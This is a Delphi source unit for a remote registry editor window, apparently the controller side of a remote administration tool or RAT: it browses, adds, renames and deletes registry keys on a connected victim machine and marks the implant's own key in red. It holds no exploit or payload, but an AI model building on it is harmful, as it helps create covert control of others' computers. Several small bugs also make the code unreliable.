unit UnitRegistryEditor;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitConnection, IniFiles, ImgList, Menus, ComCtrls, ExtCtrls,
  IdTCPServer;

type
  TFormRegistryEditor = class(TForm)
    stat1: TStatusBar;
    lv1: TListView;
    spl1: TSplitter;
    tv1: TTreeView;
    pm2: TPopupMenu;
    A3: TMenuItem;
    D1: TMenuItem;
    pm1: TPopupMenu;
    A2: TMenuItem;
    D2: TMenuItem;
    il1: TImageList;
    R1: TMenuItem;
    procedure lv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure tv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure lv1CustomDrawItem(Sender: TCustomListView; Item: TListItem;
      State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure tv1Change(Sender: TObject; Node: TTreeNode);
    procedure tv1DblClick(Sender: TObject);
    procedure A2Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure D2Click(Sender: TObject);
    procedure A3Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
    RegistryPath: string;
    procedure SetRegistryPath(rPath: string);
    procedure UpdateStatus(Status: string);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormRegistryEditor: TFormRegistryEditor;

implementation

uses
  UnitConstants, UnitFunctions, UnitRegistryManager;

{$R *.dfm}

constructor TFormRegistryEditor.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormRegistryEditor.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;
     
procedure TFormRegistryEditor.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  MainCommand: string;
  TmpStr, TmpStr1: string;
  i: Integer;
  TmpItem: TListItem;
  TmpNode: TTreeNode;
begin
  MainCommand := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
  Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

  if MainCommand = REGISTRYLISTKEYS then
  begin
    tv1.Items.BeginUpdate;

    while ReceivedDatas <> '' do                               
    begin
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      TmpNode := tv1.Items.AddChild(tv1.Selected, TmpStr);
      TmpNode.ImageIndex := 1;
      TmpNode.SelectedIndex := 1;
    end;

    tv1.Selected.Expanded := True;
    tv1.Items.EndUpdate;
    UpdateStatus('Remote registry keys listed: ' + IntToStr(tv1.Selected.Count));
  end
  else
  
  if MainCommand = REGISTRYLISTVALUES then
  begin
    lv1.Clear;
    lv1.Items.BeginUpdate;

    while ReceivedDatas <> '' do
    begin
      TmpItem := lv1.Items.Add;
      
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      if TmpStr = Client.ConnInfos.RegKey then TmpItem.Data := TObject(clRed);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      TmpItem.Caption := TmpStr;
      TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      Delete(ReceivedDatas, 1, 2);

      if (TmpItem.SubItems[0] = 'REG_DWORD') or (TmpItem.SubItems[0] = 'REG_BINARY') then
        TmpItem.ImageIndex := 3
      else TmpItem.ImageIndex := 2;
    end;

    lv1.Items.EndUpdate;
    UpdateStatus('Remote registry values listed: ' + IntToStr(lv1.Items.Count));
  end
  else

  if MainCommand = REGISTRYDELETEKEY_VALUE then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    lv1.Items.BeginUpdate;
    for i := 0 to lv1.Items.Count-1 do
    begin
      if lv1.Items.Item[i].Caption = TmpStr then
      begin
        if ReceivedDatas = 'Y' then
        begin
          UpdateStatus('Remote registry value "' + TmpStr + '" deleted!');
          lv1.Items.Item[i].Delete;
          Break;
        end
        else UpdateStatus('Failed to delete remote regitry value "' + TmpStr + '".')
      end
      else
      if tv1.Items.Item[i].Text = TmpStr then
      begin
        if ReceivedDatas = 'Y' then
        begin
          UpdateStatus('Remote registry key "' + TmpStr + '" deleted!');
          tv1.Items.Item[i].Delete;
          Break;
        end
        else UpdateStatus('Failed to delete remote regitry key "' + TmpStr + '".')
      end;
    end;
    lv1.Items.EndUpdate;
  end
  else

  if MainCommand = REGISTRYADDKEY_VALUE then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    if ReceivedDatas = 'N' then UpdateStatus('Failed to add remote registry key/value "' + TmpStr + '".') else
      UpdateStatus('Remote registry key/value "' + TmpStr + '" added!');
  end
  else

  if MainCommand = REGISTRYRENAMEKEY then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    TmpStr1 := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    tv1.Items.BeginUpdate;
    for i:=0 to tv1.Items.Count-1 do
    begin
      if (tv1.Items.Item[i].Text = TmpStr) and (TmpStr1 = 'Y') then
      tv1.Items.Item[i].Text := ReceivedDatas;
    end;
    tv1.Items.EndUpdate;

    if TmpStr1 = 'N' then UpdateStatus('Failed to rename remote registry key "' + TmpStr + '".') else
      UpdateStatus('Remote registry key "' + TmpStr + '" renamed!');
  end;
end;

procedure TFormRegistryEditor.UpdateStatus(Status: string);
begin
  stat1.Panels.Items[0].Text := Status;
end;

//From Coolvibes
function GetNodeRoot(Node: TTreeNode): string;
begin
  repeat
    Result := Node.Text + '\' + Result;
    Node := Node.Parent;
  until not Assigned(Node)
end;
  
procedure TFormRegistryEditor.SetRegistryPath(rPath: string);
var
  TmpStr: string;
begin
  if (rPath = 'HKEY_CLASSES_ROOT\') or (rPath = 'HKEY_CURRENT_USER\') or
    (rPath = 'HKEY_LOCAL_MACHINE\') or (rPath = 'HKEY_USERS\') or
    (rPath = 'HKEY_CURRENT_CONFIG\') or (rPath = '')
  then
  begin
    RegistryPath := rPath;
    Exit;
  end;

  TmpStr := Copy(rPath, 1, Length(rPath)-1);
  Delete(TmpStr, LastDelimiter('\', TmpStr) + 1, Length(TmpStr));
  RegistryPath := TmpStr;
end;

procedure TFormRegistryEditor.lv1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv1.Selected) then
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := False
  else for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;
end;

procedure TFormRegistryEditor.tv1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(tv1.Selected) then
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := False
  else for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := True;
end;

procedure TFormRegistryEditor.lv1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormRegistryEditor.tv1Change(Sender: TObject; Node: TTreeNode);
begin
  SetRegistryPath(GetNodeRoot(tv1.Selected));
  if (RegistryPath = '') or (RegistryPath = Client.ConnInfos.User_Computer) then Exit;
  if Copy(RegistryPath, 1, Pos('\', RegistryPath)-1) = Client.ConnInfos.User_Computer then
    Delete(RegistryPath, 1, Length(Client.ConnInfos.User_Computer) + 1);
  SendDatas(Client.AThread, REGISTRYLISTVALUES + '|' + RegistryPath + tv1.Selected.Text);
  UpdateStatus('Requesting remote registry values list, please wait...');
end;

procedure TFormRegistryEditor.tv1DblClick(Sender: TObject);
begin
  SetRegistryPath(GetNodeRoot(tv1.Selected));
  if (RegistryPath = '') or (RegistryPath = Client.ConnInfos.User_Computer) then Exit;
  if Copy(RegistryPath, 1, Pos('\', RegistryPath)-1) = Client.ConnInfos.User_Computer then
    Delete(RegistryPath, 1, Length(Client.ConnInfos.User_Computer) + 1);
  SendDatas(Client.AThread, REGISTRYLISTKEYS + '|' + RegistryPath + tv1.Selected.Text);
  UpdateStatus('Requesting remote registry keys list, please wait...');
end;

procedure TFormRegistryEditor.A2Click(Sender: TObject);
var
  TmpStr: string;
  Node: TTreeNode;
begin
  if RegistryPath = '' then Exit;
  if not InputQuery('New registry key', 'Type key name', TmpStr) then Exit;
  SendDatas(Client.AThread, REGISTRYADDKEY_VALUE + '|' + RegistryPath + TmpStr + '|||');
end;

procedure TFormRegistryEditor.R1Click(Sender: TObject);
var
  TmpStr: string;
  Node: TTreeNode;
begin
  if RegistryPath = '' then Exit;
  if not InputQuery('Rename registry key', 'Type key name', TmpStr) then Exit;
  SendDatas(Client.AThread, REGISTRYRENAMEKEY + '|' + RegistryPath + tv1.Selected.Text + '|' +
            RegistryPath + TmpStr);
end;

procedure TFormRegistryEditor.D2Click(Sender: TObject);
begin
  if (RegistryPath = 'HKEY_CLASSES_ROOT\') or (RegistryPath = 'HKEY_CURRENT_USER\') or
    (RegistryPath = 'HKEY_LOCAL_MACHINE\') or (RegistryPath = 'HKEY_USERS\') or
    (RegistryPath = 'HKEY_CURRENT_CONFIG\') or (RegistryPath = '')
  then Exit;

  
  if MessageBox(Handle,
                PChar('You are going to delete remote registry key "' + tv1.Selected.Text +
                '", this may cause system failure. Do you want to continue?'),
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_YESNOCANCEL or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> IDYES then Exit;

  SendDatas(Client.AThread, REGISTRYDELETEKEY_VALUE + '|' + RegistryPath + '|' + tv1.Selected.Text + '|N');
end;

procedure TFormRegistryEditor.A3Click(Sender: TObject);
var
  TmpForm: TFormRegistryManager;
  i: Integer;
begin
  if RegistryPath = '' then Exit;
  
  TmpForm := TFormRegistryManager.Create(Application);
  TmpForm.edtName.Text := '';
  TmpForm.mmoData.Text := '';
  TmpForm.rgType.ItemIndex := 0;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  if (TmpForm.edtName.Text = '') or (TmpForm.mmoData.Text = '') then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;
         
  i := TmpForm.rgType.ItemIndex;

  SendDatas(Client.AThread, REGISTRYADDKEY_VALUE +
            RegistryPath + '|' + TmpForm.edtName.Text + '|' +
            TmpForm.rgType.Items.Strings[i] + '|' + TmpForm.mmoData.Text);
            
  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormRegistryEditor.D1Click(Sender: TObject);
begin
  if (RegistryPath = 'HKEY_CLASSES_ROOT\') or (RegistryPath = 'HKEY_CURRENT_USER\') or
    (RegistryPath = 'HKEY_LOCAL_MACHINE\') or (RegistryPath = 'HKEY_USERS\') or
    (RegistryPath = 'HKEY_CURRENT_CONFIG\') or (RegistryPath = '')
  then Exit;

  
  if MessageBox(Handle,
                PChar('You are going to delete remote registry value "' + lv1.Selected.Caption +
                '", this may cause system failure. Do you want to continue?'),
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_YESNOCANCEL or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> IDYES then Exit;

  SendDatas(Client.AThread, REGISTRYDELETEKEY_VALUE + '|' +
            RegistryPath + tv1.Selected.Text + '|' + lv1.Selected.Caption + '|Y');
end;

procedure TFormRegistryEditor.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
  TmpStr: string;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Registry editor', 'Left', Left);
  IniFile.WriteInteger('Registry editor', 'Top', Top);
  IniFile.WriteInteger('Registry editor', 'Width', Width);
  IniFile.WriteInteger('Registry editor', 'Height', Height);
  IniFile.Free;
end;

procedure TFormRegistryEditor.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Files manager', 'Left', 207);
  Top := IniFile.ReadInteger('Files manager', 'Top', 118);
  Width := IniFile.ReadInteger('Files manager', 'Width', 610);
  Height := IniFile.ReadInteger('Files manager', 'Height', 341);
  IniFile.Free;
end;

procedure TFormRegistryEditor.FormShow(Sender: TObject);
begin
  tv1.Items.Item[0].Text := Client.ConnInfos.User_Computer;
end;

end.
